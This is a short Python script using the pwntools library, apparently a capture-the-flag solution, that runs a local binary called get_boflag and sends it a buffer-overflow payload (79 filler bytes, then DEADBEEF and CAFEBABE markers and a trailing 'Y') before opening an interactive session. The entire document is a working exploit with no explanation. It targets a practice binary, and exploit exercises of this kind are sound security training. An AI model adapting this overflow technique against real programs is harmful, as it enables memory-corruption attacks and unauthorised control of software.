from pwn import *

context.binary = "./get_boflag"
p = process()

offset = 79
payload = b"A" * offset + b"DEADBEEF" + b"CAFEBABE" + b"Y"

p.sendline(payload)
p.interactive()